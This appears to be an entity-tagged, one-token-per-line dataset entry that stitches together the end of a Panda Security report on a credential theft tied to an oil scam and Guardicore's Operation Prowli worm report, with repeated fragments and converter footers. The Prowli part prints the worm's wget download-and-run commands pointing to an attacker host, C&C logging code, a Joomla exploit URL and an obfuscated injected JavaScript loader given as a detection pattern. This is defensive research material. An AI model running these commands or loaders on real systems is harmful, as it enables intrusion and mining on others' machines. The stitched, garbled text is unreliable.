NNPC
.

In
short
,
the
scam
works
like
this
:
the
scammer
contacts
a
broker
/
middleman
and
offers
them
a
large
amount
of
BLCO
,
one
to
two
million
barrels
,
at
a
very
competitive
price
.

If
the
potential
buyer
is
interested
,
they
will
ask
for
documentary
evidence
that
the
product
exists
(
Proof
of
Product
)
.

There
are
different
types
of
documents
that
can
be
provided
:
a
quality
certificate
,
a
certificate
of
origin
,
a
cargo
manifest
,
or
the
letter
of
ATS
(
Authority
to
Sell
)
issued
by
the
NNPC
.

To
close
the
deal
,
the
buyer
must
pay
a
significant
amount
of
money
-
from
$50,000
to
$100,000
-
in
advance
.

However
,
once
they
pay
the
money
they
are
met
with
the
nasty
surprise
that
there
is
no
oil
.

The
weakest
link
in
the
scam
is
the
documentation
that
the
scammer
must
provide
to
convince
the
buyer
.

Even
though
all
of
these
documents
can
be
forged
,
the
fraudster
runs
the
risk
of
being
discovered
by
the
broker
.

To
make
it
more
plausible
,
scammers
attempt
to
use
real
documents
so
that
if
the
broker
wishes
to
check
their
legitimacy
,
they
will
see
that
they
are
real
.

However
,
how
difficult
is
it
to
obtain
these
documents
?

It
is
very
complicated
.

The
only
way
to
do
it
is
from
companies
in
the
sector
.

Oil
transportation
companies
,
for
example
.

This
was
just
a
theory
,
at
that
time
we
didn't
have
any
evidence
to
prove
that
that
was
the
objective
of
those
responsible
for
the
'
Phantom B_malware.normal
Menace I
'
attack
.

pandasecurity.com B_url.normal

pandalabs

Is
it
possible
to
know
who
is
behind
the
attack
?

In
most
cases
,
getting
to
know
who
is
behind
a
cyber-attack
is
very
complex
,
sometimes
impossible
.

In
this
case
we
were
fairly
pessimistic
.

To
make
it
worse
,
the
fact
that
no
malware
had
been
used
in
the
attack
ruled
out
the
possibility
of
finding
a
signature
to
examine
.

However
,
there
was
a
weak
spot
in
the
attack
:
the
FTP
connection
used
to
send
out
the
stolen
credentials
.

The
information
was
transmitted
using
the
FTP
command
,
and
as
that
command
was
called
by
one
of
the
scripts
,
it
was
possible
to
see
the
connection
used
,
from
where
it
was
established
and
the
credentials
used
.

The
FTP
server
belonged
to
a
free
service
that
the
attacker
had
signed
up
to
,
so
we
were
able
to
access
it
and
see
the
information
entered
when
opening
the
account
.

Yes
,
we
were
aware
that
the
information
would
probably
be
false
,
but
it
was
still
worth
checking
.

The
name
used
was
false;

googling
it
returned
zero
results
.

The
country
selected
was
the
United
States
,
which
could
be
false
as
well
.

Then
we
had
a
look
at
the
city
information
.

The
name
in
this
field
was
unknown
to
us
:
'
Ikeja
'
.

It
turns
out
that
Ikeja
is
the
name
of
a
suburb
in
Lagos
-
the
capital
city
of
Nigeria
-
,
also
known
as
the
'
Computer
Village
'
as
it
hosts
the
nation's
largest
market
cluster
for
technology
products
.

This
information
could
also
be
false
,
but
the
fact
that
whoever
opened
the
account
was
familiar
with
that
name
meant
that
they
were
from
Nigeria
themselves
or
knew
the
country
very
well
.

Then
came
the
email
address
.

This
was
the
only
element
that
we
knew
for
sure
had
to
be
real
and
valid
,
as
it
is
the
address
at
which
users
receive
the
service
activation
message
,
password
reset
messages
,
etc
.

In
this
case
it
was
a
Gmail
address
:

*********5@gmail.com

The
password
was
unknown
,
they
hadn't
used
the
same
one
as
for
the
FTP
service
.

We
took
the
9
characters
that
made
up
the
email
address
and
started
combining
them
to
see
if
we
could
form
an
alias
,
a
first
name
,
a
last
name
or
similar
.

And
we
got
it
.

We
googled
what
looked
like
a
first
name
and
last
name
and
got
a
hit
.

It
was
the
name
of
a
person
with
Nigerian
nationality
and
Twitter
,
Facebook
and
LinkedIn
accounts
,
which
allowed
us
to
obtain
some
more
information
about
him
.

All
those
accounts
belonged
to
a
person
living
in
...
Ikeja
and
who
is
the
owner
of
a
goods
transport
company
.

Ikeja

?????????5@gmail.com

Too
many
coincidences
.

So
,
even
though
all
the
evidence
seems
to
indicate
that
this
is
the
person
responsible
for
the
attack
,
there
is
no
way
for
us
to
prove
it
.

It
would
require
the
police
to
launch
an
investigation
and
obtain
information
about
the
FTP
connections
,
etc
.
,
in
order
to
get
the
IP
address
of
the
person
who
signed
up
to
the
service
and
find
the
culprit
.

pandasecurity.com B_url.normal

pandalabs

Conclusion

With
all
the
information
we
had
in
our
hands
,
the
idea
of
what
to
do
next
was
clear
:
inform
the
police
so
that
they
could
start
an
investigation
and
apprehend
whomever
was
responsible
for
the
hack
.

Since
one
the
affected
companies
was
from
Spain
,
we
contacted
the
Spanish
Civil
Guard
,
a
police
force
that
we
have
collaborated
with
in
the
past
and
which
has
a
very
good
reputation
in
the
fight
against
cyber-crime
.
Unfortunately
,
they
face
a
difficult
-
to
-
solve
problem
:
to
start
an
investigation
they
need
a
victim
who
reports
the
crime
.
It
looks
simple
,
but
it
isn't
:
none
of
the
victims
of
this
attack
is
willing
to
report
it
.

Why
?
If
our
theory
is
correct
,
the
information
stolen
from
these
companies
has
not
been
used
against
them
,
but
to
defraud
other
people
,
oil
buyers
.

It
is
for
that
reason
that
the
companies
which
have
had
their
credentials
compromised
prefer
not
to
report
the
attack
for
fear
of
having
their
name
in
the
spotlight
.

They
prefer
to
keep
a
low
profile
,
change
their
credentials
and
continue
to
operate
just
as
if
nothing
had
happened
.

Some
countries
have
laws
that
force
companies
to
report
every
hacking
intrusion
where
information
is
stolen
.

However
,
that
obligation
is
usually
limited
to
incidents
in
which
the
stolen
information
belongs
to
a
third
party
(
customers
,
partners
,
etc
.
)
.

In
this
case
,
the
stolen
credentials
belonged
to
the
company
under
attack
,
which
therefore
is
not
forced
by
law
to
report
the
theft
.

We
started
this
article
by
calling
this
case
'
The
Phantom B_malware.normal
Menace I
'
,
due
to
the
nature
of
the
attack
and
the
absence
of
malware
to
perpetrate
it
.

Continuing
with
the
homage
to
Star
Wars
,
it
is
time
to
move
on
to
'
The
Force
Awakens
'
:
all
major
companies
must
awake
to
their
vulnerability
and
realize
that
absolute
security
doesn't
exist
and
behavior
-
based
protection
is
limited
.

They
need
to
go
one
step
further
,
performing
regular
audits
in
order
to
assess
and
address
potential
weaknesses
in
their
network
security
.

Despite
traditional
security
solutions
are
still
a
necessity
,
they
are
no
longer
enough
.

It
is
important
to
understand
that
our
defense
systems
must
adapt
to
the
level
of
attack
received
,
and
so
it
is
necessary
to
implement
new
protection
strategies
that
give
organizations
total
control
and
visibility
over
their
networks
.

The
companies
like
Black
Gold
usually
prefer
not
to
demand
this
kind
of
attacks
in
order
keep
them
in
anonymity
.

pandasecurity.com B_url.normal

pandalabs

This
article
in
whole
or
in
part
may
not
be
duplicated
,
reproduced
,
stored
in
a
retrieval
system
or
retransmitted
without
prior
written
permission
of
Panda
Security
.

©
Panda
Security
2015
.

All
Rights
Reserved
.

panda

pandasecurity.com B_url.normal

pandasecurity.com B_url.normal

pandalabslabs
PRODUCT

USE
CASES

PARTNERS

COMPANY

RESOURCES

BLOG

SUPPORT

LABS

Get
a
Demo

Infection
Monkey

Careers

Contact
Us

OPERATION
Prowli B_malware.infosteal
:

MONETIZING
40,000
VICTIM
MACHINES

June
6
,
2018

BY

OFRI
ZIV

DANIEL
GOLDBERG

MATALON

1
COMMENT

SHARE

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Guardicore
Labs
team
has
uncovered
a
traffic
manipulation
and
cryptocurrency
mining
campaign
infecting
a
wide
number
of
organizations
in
industries
such
as
finance
,
education
and
government
.
This
campaign
,
dubbed
Operation
Prowli B_malware.infosteal
,
spreads
malware
and
malicious
code
to
servers
and
websites
and
has
compromised
more
than
40,000
machines
in
multiple
areas
of
the
world
.

Prowli B_malware.infosteal
uses
various
attack
techniques
including
exploits
,
password
brute
-
forcing
and
weak
configurations
.

This
multi-purpose
operation
targets
a
variety
of
platforms
–
CMS
servers
hosting
popular
websites
,
backup
servers
running
HP
Data
Protector
,
DSL
modems
and
IoT
devices
.

Victim
machines
are
monetised
using
a
variety
of
methods
,
relying
on
internet
trends
such
as
digital
currencies
and
traffic
redirection
.

Traffic
monetisation
frauds
are
quite
common
and
are
based
on
redirecting
website
visitors
from
their
legitimate
destination
to
websites
advertising
malicious
browser
extensions
,
tech
support
scam
services
,
fake
services
and
more
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

websites
advertising
malicious
browser
extensions
,
tech
support
scam
services
,
fake
services
and
more
.

We
uncover
the
entire
Prowli B_malware.infosteal
operation
,
all
the
way
from
the
unware
user
visiting
an
infected
website
through
the
traffic
monetizer
to
the
scam
operator
.

In
this
report
,
we
focus
on
the
attackers
'
techniques
,
methodologies
,
infrastructure
and
goals
.

We
will
dive
into
the
technical
details
and
the
way
the
money
flows
.

A
list
of
indicators
of
compromise
(
IOCs
)
related
to
the
operation
is
provided
at
the
end
of
the
post
.

Discovering
the
r2r2
worm

On
the
4th
of
April
,
the
GuardiCore
Global
Sensor
Network
(
GGSN
)
reported
a
group
of
SSH
attacks
communicating
with
a
C&C
server
.

The
attacks
all
behaved
in
the
same
fashion
,
communicating
with
the
same
C&C
server
to
download
a
number
of
attack
tools
named
r2r2
along
with
a
cryptocurrency
miner
.

Some
of
the
attackers
'
steps
as
recorded
by
GGSN

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

We
traced
this
campaign
across
several
networks
in
different
countries
,
associated
with
different
industries

The
attackers
were
using
unfamiliar
tools
new
to
the
the
Guardicore
Reputation
repository
as
well
as
other
known
datasets
such
as
VirusTotal

The
attackers
used
binaries
with
the
same
domain
name
hardcoded
in
the
code
and
each
of
the
binaries
was
designed
to
attack
different
services
and
CPU
architectures

Over
a
period
of
3
weeks
,
we
captured
dozens
of
such
attacks
per
day
coming
from
over
180
IPs
from
a
variety
of
countries
and
organizations
.

These
attacks
led
us
to
investigate
the
attackers
'
infrastructure
and
discover
a
wide
ranging
operation
attacking
multiple
services
.

Scope

We
found
that
the
attackers
store
a
large
collection
of
victim
machines
with
IPs
and
domains
that
expose
different
services
to
the
Internet
.

These
services
are
all
either
vulnerable
to
remote
pre-authentication
attacks
or
allow
the
attackers
to
bruteforce
their
way
inside
.

The
list
of
targeted
services
includes
Drupal
CMS
websites
,
WordPress
sites
,
DSL
modems
,
servers
with
an
open
SSH
port
,
vulnerable
IoT
devices
,
servers
exposing
HP
Data
Protector
software
and
more
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Most
of
the
victims
ran
with
weak
SSH
credentials

The
attackers
behind
Operation
Prowli B_malware.infosteal
assaulted
organizations
of
all
types
and
sizes
which
is
in
line
with
previous
attacks
we
investigated
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Operation
Prowli B_malware.infosteal
'
s
victims

Operation
Prowli B_malware.infosteal
has
compromised
a
wide
range
of
services
,
without
targeting
a
specific
sector
.


Victims
by
Industry

Monetization
:
How
does
the
money
flow
?

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!


The
attackers
behind
Operation
Prowli B_malware.infosteal
are
focused
on
making
money
from
their
efforts
rather
than
ideology
or
espionage
.

We
currently
understand
two
key
flows
of
revenue
in
this
operation
.

The
first
source
of
revenue
comes
from
cryptocurrency
mining
.

Typically
,
cryptocurrency
mining
is
considered
a
resource-heavy
operation
that
involves
a
large
upfront
investment
followed
by
ongoing
traffic
and
energy
costs
.

The
attackers
behind
Prowli B_malware.infosteal
incur
no
expenses
when
they
use
r2r2
to
take
over
computers
owned
by
others
and
use
mining
pools
to
launder
their
gains
.

Cryptocurrency
is
a
common
payload
of
modern
worms
,
and
in
this
case
as
in
many
others
,
our
attackers
prefer
to
mine
Monero
,
a
cryptocurrency
focused
on
privacy
and
anonymity
to
a
greater
degree
than
Bitcoin
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Second
source
of
revenue
is
traffic
monetization
fraud
.

Traffic
monetizers
,
such
as
roi777
,
buy
traffic
from
'
website
operators
'
such
as
the
Prowli B_malware.infosteal
attackers
and
redirect
it
to
domains
on
demand
.

Website
'
operators
'
earn
money
per
traffic
sent
through
roi777
.

The
destination
domains
frequently
host
different
scams
,
such
as
fake
services
,
malicious
browser
extensions
and
more
.

An
example
of
a
fake
website
visitors
are
redirected
to
This
is
a
dirty
business
and
typically
,
all
three
sides
,
buyers
and
sellers
of
traffic
and
the
middlemen
,
engaging
in
illicit
activity
.

In
our
case
,
Prowli B_malware.infosteal
sells
traffic
by
redirecting
visitors
from
compromised
legitimate
websites
to
domains
hosting
tech
support
scams
,
fake
browser
extensions
,
scam
products
and
more
.

The
traffic
monetizer
working
with
the
Prowli B_malware.infosteal
operation
was
previously
investigated
by
an
anonymous
researcher
,
who
was
able
to
connect
it
to
SEO
fraud
and
tech
support
scams
.

Later
,
another
anonymous
researcher
hacked
the
roi777

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

connect
it
to
SEO
fraud
and
tech
support
scams
.

Later
,
another
anonymous
researcher
hacked
the
roi777
website
and
uploaded
the
raw
data
to
Pastebin
.

The
dump
contains
raw
SQL
tables
that
appear
to
come
from
the
'
legitimate
'
part
of
the
website
,
listing
users
,
bitcoin
wallet
addresses
,
telegram
IDs
etc
,
providing
a
dataset
of
who
is
using
the
traffic
redirection
service
.

What's
Under
Attack
?

Operation
Prowli B_malware.infosteal
operators
maintain
a
toolbox
with
a
variety
of
attack
methods
to
fit
their
needs
.

We've
seen
different
types
of
attacks
,
each
based
on
a
different
service
.

Some
attacks
are
based
on
worms
that
randomly
attack
IPs
in
the
internet
,
while
others
targeting
CMS
servers
use
a
master
list
of
targets
.

A
partial
list
of
the
attack
vectors
we've
seen
include
:

Machines
running
SSH
are
hacked
by
a
self
propagating
worm
spread
by
brute
force
credential
guessing
,
the
victims
download
and
run
a
cryptocurrency
miner
.

Joomla
!
Servers
running
the
K2
extension
are
attacked
with
file
download
vulnerability
,
using
a
URL
such
as

http://.com/index.php?option=com_k2&view=media&task=connector&cmd=file&target=[base64 B_url.unknown
of I
file I
path]&download=1 I

This
provides
the
attackers
sensitive
server
configuration
data
such
as
passwords
and
API
keys
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Joomla
!
Configuration
details

A
variety
of
DSL
modems
are
hacked
by
accessing
their
internet
facing
configuration
panel
using
a
URL
such
as
http://:7547/UD/act?1 B_url.unknown
and
passing
in
parameters
exploiting
a
known
vulnerability
.

The
vulnerability
resides
in
the
processing
of
SOAP
data
and
allows
remote
code
execution
.

This
vulnerability
was
previously
used
by
the
Mirai
worm
.

WordPress
servers
are
hacked
by
a
variety
of
infectors
–
some
attempt
to
brute
force
login
into
the
WP
administrative
panel
,
others
exploit
old
vulnerabilities
in
WordPress
installations
.

A
third
type
of
attacks
searches
for
servers
with
configuration
problems
,
such
as
exposing
FTP
credentials
when
accessing
http://.com/wp-config.php~ B_url.unknown
.

Servers
running
HP
Data
Protector
exposed
to
the
internet
(
over
port
5555
)
are
exploited
using
a
4
year
old
vulnerability
–
CVE-2014-2623
used
to
execute
commands
with
system
privileges
.

The
attackers
also
target
systems
with
Drupal
,
PhpMyAdmin
installations
,
NFS
boxes
and
servers
with
exposed
SMB
ports
open
to
brute
force
credential
guessing
.

An
additional
type
of
victims
are
compromised
servers
which
host
a
well
known
open
source
webshell
named
'
WSO
Web
Shell
'
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Complete
control
of
infected
machines

These
php-based
shells
provide
access
and
remote
code
execution
on
different
compromised
machines
,
frequently
running
vulnerable
versions
of
WordPress
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Easy
for
the
attacker
to
use
the
machines
for
further
attacks

We
believe
that
these
webshells
are
used
by
the
attackers
as
pivot
points
.

They
provide
a
reliable
platform
to
run
scanning
and
attack
scripts
.

Bruteforce
for
the
win

Let's
take
a
closer
look
at
the
brute
force
SSH
attack
that
tipped
us
off
to
this
operation
.

The
binary
named
r2r2
is
written
in
Golang
.

A
quick
look
showed
that
r2r2
randomly
generates
IP
address
blocks
and
iteratively
tries
to
brute
force
SSH
logins
with
a
user
/
password
dictionary
.

Once
it
breaks
in
,
it
runs
a
series
of
commands
on
the
victim
.

These
commands
run
wget
to
download
files
from
a
hard
coded
server
:

Multiple
copies
of
the
worm
for
different
CPU
architectures

A
cryptocurrency
miner
and
configuration
file

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
worm
runs
commands
on
remote
victims
and
then
reports
credentials
to
a
C2
server

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
commands
used
were
:

cd
/tmp;wget
-O
r2r2
h[]://wp.startreceive.tk/tdest/z/r2r2;chmod
777
r2r2;./r2r2
>
/dev/null
2>&1
&

cd
/tmp;wget
-O
r2r2-a
h[]://wp.startreceive.tk/test/z/r2r2-a;chmod
777
r2r2-a;./r2r2-a
>
/dev/null
2>&1
&

cd
/tmp;wget
-O
r2r2-m
h[]://wp.startreceive.tk/test/z/r2r2-m;chmod
777
r2r2-m;./r2r2-m
>
/dev/null
2>&1

cd
/tmp;wget
-O
xm111
h[]://wp.startreceive.tk/test/z/xm111;chmod
777
xm111;wget
-O
config.json
h[]://wp.startreceive.tk/test/z/config.json;chmod
777
config.json;./xm111
>
/dev/null
2>&1

The
different
versions
of
the
r2r2
binary
,
r2r2
,
r2r2-a
and
r2r2-m
are
the
same
binary
compiled
for
different
platforms
,
x86
,
ARM
and
MIPS
respectively
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

From
the
binary
we
also
extracted
strings
helping
us
name
the
attackers

After
breaking
into
the
server
,
the
credentials
used
to
login
to
the
victim
are
transmitted
over
plaintext
HTTP
to
wp.startreceive[.]tk/test/p.php B_url.unknown
and
logged
in
the
attackers
server
.

Some
versions
of
the
worm
send
more
details
about
the
victims
such
as
CPU
,
kernel
dist
version
,
etc
.

Joomla!.tk
C&C

The
attackers
'
attack
tools
report
to
a
C&C
server
running
under
the
domain
name
wp.startreceive[.]tk B_url.unknown
.

This
Joomla
!

server
is
a
compromised
server
,
which
the
attackers
reuse
to
track
their
malware
,
collect
information
from
the
ever
growing
victims
list
and
also
serve
different
payloads
to
compromised
machines
.

The
C&C
logic
is
implemented
by
a
group
of
PHP
files
who
receive
data
on
victims
from
the
relevant
infectors
and
store
the
details
.

The
victims
are
catalogued
by
exploitation
method
with
all
the
details
needed
to
allow
the
attackers
to
access
them
again
at
any
given
time
.

if
(
isset
(
$_GET['p
'
]
)
)
{
$myfile
=
file_put_contents(
'
ip2_log.txt
'
,
$ip
.
'
||
'
.$_GET[
'
p
'
].PHP_EOL
,
FILE_APPEND
|
LOCK_EX);
elseif
(
isset
(
$_GET['p1'])){

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

].PHP_EOL
,
FILE_APPEND
|
LOCK_EX);
$myfile
=
file_put_contents(
'
ip3_log.txt
'
,
$ip
.
'
||
'
.$_GET[
'
p1
'
].PHP_EOL
,
FILE_APPEND
|
LOCK_EX);
else
{
if
(
isset
(
$_GET[
'
p2
'
])){
$myfile
=
file_put_contents(
'
ip4_log.txt
'
,
$ip
.
'
||
'
.$_GET[
'
p2
'
].PHP_EOL
,
FILE_APPEND
|
LOCK_EX);
if
(
isset
(
$_GET[
'
t1
'
]
)
)
{
$myfile
=
file_put_contents(
'
mhcl_log.txt
'
,
$ip.PHP_EOL
,

FILE_APPEND
|
LOCK_EX);
if
(
isset
(
$_GET[
'
t2
'
]
)
)
{
$myfile
=
file_put_contents(
'
dru_log.txt
'
,
$_GET[
'
t2
'
].PHP_EOL
,

FILE_APPEND
|
LOCK_EX);

A
snippet
from
the
attackers
C&C
code

For
every
targeted
service
,
victim
data
is
stored
in
a
log
file
with
all
the
data
the
attacker
needs
to
regain
access
to
the
machine
.

For
example
:

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Joomla
!
–
URL
exposing
Joomla
!
configuration
file

WordPress
administration
panel
–
Login
credentials

SSH
–
Login
credentials

Joomla
!
–
URL
exposing
Joomla
!
configuration
file

WordPress
databases
–
user
,
password
,
db
name
and
mysql
ip/domain

WordPress
weak
configuration
–
URL
exposing
FTP
credentials

DSL
modems
–
URL
exposing
vulnerable
configuration
panels

Webshell
–
A
URL
hosting
'
WSO
Web
Shell
'
and
credentials

A
snippet
from
a
log
file
detailing
accessible
WordPress
MySQL
databases

Show
me
the
payload

The
attackers
behind
Operation
Prowli B_malware.infosteal
use
different
payloads
for
each
of
their
targets
.

The
SSH
brute
force
attack
provides
the
attackers
with
complete
control
of
the
system
and
are
used
to
mine
cryptocurrency
,
while
breached
websites
are
used
to
run
different
Web
frauds
.

Other
victims
are
picked
by
the
attackers
to
execute
more
attacks
,
similar
to
how
the
server
behind
wp.startreceive[.]tk B_url.unknown
was
used
as
a
C&C
server
.

A
significant
part
of
this
operation
infects
websites
that
run
vulnerable
CMS
software
.
In
some
cases
,
the
payload
is
a
PHP
file
that
infects
the
website
and
injects
code
into
different
PHP
pages
and
JavaScript
files
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Part
of
a
PHP
file
executed
on
a
vulnerable
server

The
PHP
injector
function
php_in
checks
whether
the
targeted
PHP
file
outputs
HTML
and
if
it
does
,
injects
a
snippet
of
JavaScript
code
into
the
generated
page
.

This
snippet
starts
a
process
that
ends
with
innocent
website
visitors
redirected
to
a
malicious
website
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
Prowli B_malware.infosteal
attackers
intermediate
between
infected
websites
and
roi777

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
injected
code
loads
another
JavaScript
snippet
from
stats.startreceive[.]tk/script.js
that
in
turn
,
requests
a
The
injected
code
loads
another
JavaScript
snippet
from
stats.startreceive[.]tk/script.js
that
in
turn
,
requests
a
URL
from
an
obfuscated
server
side
PHP
file
stats.startreceive[.]tk/send.php B_url.unknown
and
redirects
the
visitor
to
the
provided
URL
.

We
believe
that
the
send.php
page
belongs
to
roi777
and
is
being
used
by
Prowli B_malware.infosteal
as
the
integration
point
between
roi777's
infrastructure
and
'
website
operators
'
.

To
make
sure
roi777
doesn't
track
the
list
of
websites
controlled
by
Prowli B_malware.infosteal
operators
,
the
Prowli B_malware.infosteal
code
injector
script
uses
a
redirect
website
(
stats.startreceive[.]tk
)
on
which
the
send.php
page
is
hosted
rather
than
injecting
the
code
into
infected
websites
.

Before
and
after
the
redirector
script
is
deobfuscated

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
send.php B_url.unknown
page
retrieves
the
target
domain
name
to
which
the
victim
is
later
redirected
to
from
roi777[.]com B_url.unknown
.

This
website
provides
randomly
chosen
domains
,
all
redirecting
to
different
websites
of
different
types
.

The
attackers
append
a
unique
id
number
to
a
target
domain
,
allowing
roi777
to
keep
track
of
who
is
redirecting
traffic
.

An
example
of
a
tech
support
scam
visitors
are
redirected
to

To
sum
it
up
,
Prowli B_malware.infosteal
takes
over
legitimate
websites
and
turns
them
,
without
their
knowing
,
into
redirectors
of
traffic
towards
malicious
websites
,
some
of
which
are
simple
scams
,
others
reference
tech
support
scams
.

Detection
&
Prevention

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

The
attacks
are
based
on
a
mix
of
known
vulnerabilities
and
credential
guessing
.

This
means
prevention
should
consist
of
using
strong
passwords
and
keeping
software
up
to
date
.

While
'
patch
your
servers
and
use
strong
passwords
'
may
sound
trivial
we
know
that
'
in
real
life
'
things
are
much
more
complicated
.

Alternatives
include
passwords
'
may
sound
trivial
we
know
that
'
in
real
life
'
things
are
much
more
complicated
.

Alternatives
include
locking
down
systems
and
segmenting
vulnerable
or
hard
to
secure
systems
,
to
separate
them
from
the
rest
of
your
network
.

For
CMS
software
,
if
routine
patching
or
external
hosting
is
not
a
solution
,
assume
at
some
point
it
will
be
hacked
and
follow
strict
hardening
guides
.

The
major
CMS
vendors
WordPress
and
Drupal
provide
hardening
guides
.

For
example
,
a
locked
down
WordPress
installation
would
have
prevented
attackers
from
modifying
files
with
their
injected
code
.

For
general
purpose
PHP
websites
,
OWASP
provides
a
hardened
PHP
configuration
.

Segmentation
is
a
good
practice
and
since
you
can't
always
prevent
the
breach
,
you
should
segment
and
monitor
your
network
to
minimise
harm
and
avoid
infamous
breaches
such
as
the
fish
tank
breach
.

Routinely
review
who
and
what
can
access
the
servers
.

Keep
this
list
to
a
minimum
and
pay
special
attention
to
IoT
devices
whose
credentials
cannot
be
changed
.

Monitoring
connections
would
easily
show
compromised
devices
communicating
with
cryptocurrency
mining
pools
.

R2R2
infected
machines

If
you
have
an
infected
machine
with
r2r2
,
stopping
the
worm
&
miner
processes
(
r2r2
and
xm11
)
and
deleting
the
files
will
suffice
to
clean
up
the
attack
.

Don't
forget
to
change
passwords
after
the
cleanup
.

You
can
detect
these
machines
by
looking
for
high
CPU
usage
or
an
abnormal
amount
of
outgoing
SSH
connections
to
unknown
IPs
.

Detect
visitors
of
Prowli B_malware.infosteal
infected
websites

Discovering
if
any
of
the
computers
in
your
network
has
visited
an
infected
website
can
be
done
by
examining
network
traffic
and
searching
for
traffic
to
wp.startreceive[.]tk B_url.distribute
and
stats.startreceive[.]tk B_url.distribute
.

Machines
that
tried
to
resolve
one
of
these
domains
,
have
previously
visited
an
infected
website
.

We
advise
you
to
make
sure
users
have
not
installed
any
malicious
software
or
were
exploited
by
common
browser
vulnerabilities
.

Also
,
it
might
be
worth
to
search
for
domains
ending
in
.tk
.

While
there
are
legitimate
web
sites
under
that
gTLD
,
according
to
this
research
,
phishing
domains
are
incredibly
common
under
this
register
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Detect
compromised
CMS
servers

To
check
if
a
website
is
compromised
,
search
the
code
files
(
PHP
and
JS
files
)
for
the
following
snippet
:

JavaScript
files
:

eval(String.fromCharCode
(
118
,
97
,
114
,
32
,
122
,
32
,
61
,
32
,
100
,
111
,
99
,
117
,
109
,
101
,
110
,
116
,
46
,
99
,
114
,
101
,
97
,
116
,
101
,
69
,
108
,
101
,
109
,
101
,
110
,
116
,
40
,
34
,
115
,
99
,
114
,
105
,
112
,
116
,
34
,
41
,
59
,
32
,
122
,
46
,
116
,
121
,
112
,
101
,
32
,
61
,
32
,
34
,
116
,
101
,
120
,
116
,
47
,
106
,
97
,
118
,
97
,
115
,
99
,
114
,
105
,
112
,
116
,
34
,
59
,
32
,
122
,
46
,
115
,
114
,
99
,
32
,
61
,
32
,
34
,
104
,
116
,
116
,
112
,
115
,
58
,
47
,
47
,
115
,
116
,
97
,
116
,
115
,
46
,
115
,
116
,
97
,
114
,
116
,
114
,
101
,
99
,
101
,
105
,
118
,
101
,
46
,
116
,
107
,
47
,
115
,
99
,
114
,
105
,
112
,
116
,
46
,
106
,
115
,
63
,
100
,
114
,
61
,
49
,
34
,
59
,
32
,
100
,
111
,
99
,
117
,
109
,
101
,
110
,
116
,
46
,
104
,
101
,
97
,
100
,
46
,
97
,
112
,
112
,
101
,
110
,
100
,
67
,
104
,
105
,
108
,
100
,
40
,
122
,
41
,
59));

PHP
files
:

<script
language=javascript>eval(String.fromCharCode
(
118
,
97
,
114
,
32
,
122
,
32
,
61
,
32
,
100
,
111
,
99
,
117
,
109
,
101
,
110
,
116
,
46
,
99
,
114
,
101
,
97
,
116
,
101
,
69
,
108
,
101
,
109
,
101
,
110
,
116
,
40
,
34
,
115
,
99
,
114
,
105
,
112
,
116
,
34
,
41
,
59
,
32
,
122
,
46
,
116
,
121
,
112
,
101
,
32
,

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

61
,
32
,
34
,
116
,
101
,
120
,
116
,
47
,
106
,
97
,
118
,
97
,
115
,
99
,
114
,
105
,
112
,
116
,
34
,
59
,
32
,
122
,
46
,
115
,
114
,
99
,
32
,
61
,
32
,
34
,
104
,
116
,
116
,
112
,
115
,
58
,
47
,
47
,
115
,
116
,
97
,
116
,
115
,
46
,
115
,
116
,
97
,
114
,
116
,
114
,
101
,
99
,
101
,
105
,
118
,
101
,
46
,
116
,
107
,
47
,
115
,
99
,
114
,
105
,
112
,
116
,
46
,
106
,
115
,
63
,
100
,
114
,
61
,
49
,
34
,
59
,
32
,
100
,
111
,
99
,
117
,
109
,
101
,
110
,
116
,
46
,
104
,
101
,
97
,
100
,
46
,
97
,
112
,
112
,
101
,
110
,
100
,
67
,
104
,
105
,
108
,
100
,
40
,
122
,
41
,
59));</script>

If
you
find
these
snippets
or
similar
pieces
of
code
,
you
should
assume
the
website
is
compromised
and
start
from
a
clean
slate
.

Conclusion

GuardiCore
Labs
investigation
revealed
how
the
Prowli B_malware.infosteal
attackers
have
monetized
their
malicious
activity
using
cryptocurrency
mining
and
traffic
hijacking
.

They
breached
unsecured
machines
to
get
Monero
using
a
fully
automated
worm
,
and
infected
compromised
websites
to
redirect
their
visitors
to
malicious
domains
.

We
also
tied
this
operation
to
the
roi777
traffic
'
monetization
'
organisation
that
has
been
active
for
quite
some
time
.

Prowli B_malware.infosteal
has
compromised
tens
of
thousands
of
machines
by
exploiting
unsecured
websites
and
servers
.

Simple
but
efficient
attacks
can
get
you
very
far
in
today's
internet
and
it's
not
just
unsecured
IoT
devices;
Large
parts
of
the
internet
consist
of
unmaintained
systems
,
unpatched
and
left
with
default
credentials
are
targeted
.

While
cryptocurrency
mining
and
traffic
manipulation
are
the
main
uses
of
the
compromised
machines
we've
seen
,
the
attackers
keep
all
their
options
open
.

By
leaving
backdoors
and
collecting
victim
metadata
,
the
attackers
can
easily
reuse
the
victims
'
machines
for
other
purposes
or
sell
the
data
stored
to
other
criminals
.

With
PDFmyURL
anyone
can
convert
entire
websites
to
PDF
!

Indicators
of
Compromise

Files
filename

hash

r2r2

128582a05985d80af0c0370df565aec52627ab70dad3672702ffe9bd872f65d8 B_hash

r2r2-a

